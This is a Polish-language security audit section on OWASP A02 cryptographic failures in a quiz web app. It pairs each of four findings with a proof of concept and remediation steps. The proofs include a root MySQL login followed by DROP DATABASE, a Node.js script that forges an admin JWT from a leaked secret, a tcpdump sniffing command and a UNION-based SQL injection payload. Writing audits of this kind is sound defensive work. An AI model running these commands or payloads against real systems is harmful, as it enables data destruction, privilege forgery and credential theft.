# A02:2021 - Cryptographic Failures

### 5.2. A02:2021 – Cryptographic Failures

#### 📚 Wyjaśnienie Zagadnienia

Kategoria **Cryptographic Failures** obejmuje podatności wynikające z niewłaściwej ochrony danych wrażliwych. W praktyce programistycznej błędy te rzadko polegają na słabości samych algorytmów, a na ich niepoprawnej implementacji, użyciu domyślnych kluczy lub całkowitym braku szyfrowania.

W analizowanym projekcie `Quiz-Web-App` zidentyfikowano **4 podatności** tej klasy, które w środowisku produkcyjnym doprowadziłyby do krytycznego wycieku danych lub całkowitego przejęcia systemu.


#### 🔍 PODATNOŚĆ \#1: Hardcoded poświadczenia MySQL w `docker-compose.yml`

**Identyfikator:** `VUL-A02-001`
**Poziom ryzyka:** 🔴 **KRYTYCZNY**
**CWE:** CWE-798 – Use of Hard-coded Credentials

##### 📍 Lokalizacja

**Plik:** `Quiz-Web-App-master/docker-compose.yml`

##### 📝 Opis Podatności

W pliku konfiguracyjnym zdefiniowano hasło użytkownika `root` jawnym tekstem. Dodatkowo, konfiguracja mapuje wewnętrzny port bazy danych na port hosta (`3307`), co wystawia bazę na zewnątrz kontenera.

##### 💥 Proof of Concept: Bezpośrednie połączenie z bazą

Atakujący mający dostęp do sieci (lub malware na serwerze) może połączyć się bezpośrednio z bazą danych, omijając aplikację backendową.

**Komenda ataku:**

```bash
# Połączenie przy użyciu ujawnionego hasła i wystawionego portu
mysql -h 127.0.0.1 -P 3307 -u root -p"bardzo_silne_haslo_123"
```

**Rezultat:**

```text
Welcome to the MySQL monitor.  Commands end with ; or \g.
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| quiz_db            |
| sys                |
+--------------------+
mysql> DROP DATABASE quiz_db; -- Zniszczenie wszystkich danych
Query OK, 10 rows affected (0,09 sec)
```

##### 💻 Kod Podatny

```yaml
environment:
  MYSQL_ROOT_PASSWORD: "bardzo_silne_haslo_123" # Hasło jawne
ports:
  - "3307:3306" # Otwarty port
```

##### 🛡️ Rekomendacje Naprawy

1.  Usunąć hasła z plików repozytorium i przenieść je do `.env` (dodanego do `.gitignore`).
2.  W środowisku produkcyjnym nie mapować portu bazy danych na interfejs publiczny.


#### 🔍 PODATNOŚĆ \#2: Hardcoded JWT Secret w kodzie backendu

**Identyfikator:** `VUL-A02-002`
**Poziom ryzyka:** 🔴 **KRYTYCZNY**
**CWE:** **CWE-321 – Use of Hard-coded Cryptographic Key**

##### 📍 Lokalizacja

**Plik:** `Quiz-Web-App-master/backend/src/main/java/com/portal/demo/config/JwtService.java`

##### 📝 Opis Podatności

Klucz do podpisywania tokenów JWT jest wpisany na stałe w kodzie. Jego ujawnienie pozwala na generowanie fałszywych tokenów z dowolnymi uprawnieniami.

##### 💥 Proof of Concept: Fałszowanie Tokenu Administratora (Golden Ticket)

Atakujący używa znalezionego w kodzie sekretu, aby stworzyć token dla nieistniejącego super-administratora.

**Skrypt ataku (Node.js):**

```javascript

const jwt = require('jsonwebtoken');

// 1. Sekret z kodu źródłowego Java
const LEAKED_SECRET =
"20e77bab9dcfb08fa1045a87cf1aefd05f43761b5d4bca7dae3adf22b09ce8710e31abcbca81786886143b960b330cb9f24ad24de7583e9$

// 2. Payload fałszywego admina
const forgedPayload = {
  sub: "hacker_admin",
  role: "ADMIN",
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365) // rok ważności
};

// 3. Podpisywanie JWT
const token = jwt.sign(forgedPayload, Buffer.from(LEAKED_SECRET, 'hex'));

console.log("\n=== FAŁSZYWY TOKEN ADMINA ===\n");
console.log(token + "\n");
```

**Rezultat:** Serwer zaakceptuje ten token jako poprawny, dając atakującemu pełną kontrolę nad API:`
node node.js
```
=== FAŁSZYWY TOKEN ADMINA ===

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoYWNrZXJfYWRtaW4iLCJyb2xlIjoiQURNSU4iLCJpYXQiOjE3NjQwMjMxOTYsImV4cCI6MTc5NTU1OTE5Nn0.3qG3ytEcj-jZC8dOyLnVHDRuoADKWt94CDVSkInMxfI

##### 💻 Kod Podatny
```

```java
private final static String secretKey ="20e77bab9dcfb08fa10..."; // Hardcoded
```

##### 🛡️ Rekomendacje Naprawy

1.  Natychmiastowa rotacja klucza (wygenerowanie nowego).
2.  Pobieranie klucza ze zmiennych środowiskowych (`@Value("${jwt.secret}")`).


#### 🔍 PODATNOŚĆ \#3: Brak szyfrowania danych w tranzycie (HTTP)

**Identyfikator:** `VUL-A02-003`
**Poziom ryzyka:** 🟠 **WYSOKI**
**CWE:** **CWE-319 – Cleartext Transmission of Sensitive Information**

##### 📍 Lokalizacja

**Plik:** `Quiz-Web-App-master/frontend/src/app/_services/auth.service.ts`

##### 📝 Opis Podatności

Aplikacja przesyła dane (hasła, tokeny) jawnym tekstem przez HTTP.

##### 💥 Proof of Concept: Przechwycenie hasła

Atakujący w tej samej sieci Wi-Fi uruchamia przechwytywanie pakietów.

**Komenda nasłuchu:**

```bash
# Nasłuch ruchu HTTP na porcie 8080
sudo tcpdump -i lo0 -A -s 0 tcp port 8080
```

**Rezultat:** Atakujący widzi hasło w czystym tekście.

##### 💻 Kod Podatny

```typescript
const AUTH_API = 'http://localhost:8080/api/v1/auth/'; // ❌ HTTP
```

##### 🛡️ Rekomendacje Naprawy

1.  Wdrożyć certyfikat TLS/SSL na serwerze backendowym.
2.  Zmienić adresy w frontendzie na `https://`.



#### 🔍 PODATNOŚĆ \#4: Wrażliwy dump SQL w repozytorium

**Identyfikator:** `VUL-A02-004`
**Poziom ryzyka:** 🟠 **WYSOKI**
**CWE:** **CWE-200 – Exposure of Sensitive Information**

##### 📍 Lokalizacja

**Plik:** `Quiz-Web-App-master/exam_portal.sql`

##### 📝 Opis Podatności

Publicznie dostępny plik `.sql` ujawnia strukturę bazy danych.

##### 💥 Proof of Concept: Rekonesans do ataku SQL Injection

Atakujący analizuje plik `exam_portal.sql`, aby np. przygotować precyzyjny atak SQL Injection, nie musząc zgadywać nazw tabel.

**Analiza pliku:**

```bash
cat exam_portal.sql | grep "CREATE TABLE"
# Wynik:
CREATE TABLE `category` (
CREATE TABLE `category_seq` (
CREATE TABLE `question` (
CREATE TABLE `question_seq` (
CREATE TABLE `quiz` (
CREATE TABLE `quiz_seq` (
CREATE TABLE `result` (
CREATE TABLE `result_seq` (
CREATE TABLE `users` (
CREATE TABLE `users_seq` (
```

**Wykorzystanie wiedzy:**
Wiedząc, że tabela nazywa się `users` a kolumny to `username` i `password`, atakujący może skonstruować payload SQLi (jeśli znalazłby podatność w innej kategorii):
`' UNION SELECT username, password FROM users --`

Zamiast tracić czas na zgadywanie (`users`? `app_users`? `accounts`?), atakujący ma "mapę" systemu.

##### 💻 Kod Podatny

```sql
CREATE TABLE `users` ... // Jawna struktura
```

##### 🛡️ Rekomendacje Naprawy

1.  Usunąć plik z repozytorium i wyczyścić historię Gita.
2.  Używać narzędzi migracyjnych (Flyway/Liquibase).
